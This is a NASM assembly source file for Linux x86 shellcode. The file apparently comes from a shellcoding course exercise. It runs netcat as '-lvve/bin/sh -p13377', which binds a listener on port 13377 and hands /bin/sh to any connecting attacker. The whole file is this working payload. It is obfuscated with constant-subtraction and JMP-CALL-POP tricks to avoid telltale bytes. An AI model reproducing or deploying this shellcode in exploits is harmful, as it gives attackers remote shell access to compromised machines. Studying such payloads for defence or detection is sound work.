;linux x86 nc -lvve/bin/sh -p13377 shellcode
;This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker
;Author: Anonymous
;Site: http://chaossecurity.wordpress.com/
;Here is code written in NASM

section .text
    global _start
_start:
jmp short tostring

shellcode:
pop ebp			; pop the port value's address
    mov ebp, [ebp]		; get value off popped address

xor eax,eax
;-------------------------------------------------------------------
;xor edx,edx
cwd    ; replace xor edx,edx with cwd: ax signBit=0 copied to edx

;-------------------------------------------------------------------
;push 0x37373333
; used the tecnique described in the course to play with it 
mov edi , 0x48484444 
sub edi, 0x11111111
mov dword [esp-4] ,edi

;push 0x3170762d
mov dword [esp-8] , 0x3170762d
sub esp ,8

mov edx, esp

;-------------------------------------------------------------------
;"-lvve/bin/sh" replaced with JMP-CALL-POP
push eax
;push 0x68732f6e
;push 0x69622f65
;push 0x76766c2d
push ebp  ; contains "-lvve/bin/sh"

mov ecx,esp
push eax
push 0x636e2f2f
push 0x2f2f2f2f
push 0x6e69622f
mov ebx, esp
push eax
push edx
push ecx
push ebx

;-------------------------------------------------------------------
;xor edx,edx
cwd  ; replace xor edx,edx with cwd: ax signBit=0 copied to edx

mov  ecx,esp
mov al,11
int 0x80

;-------------------------------------------------------------------
tostring:
    call shellcode
    port db "-lvve/bin/sh"	
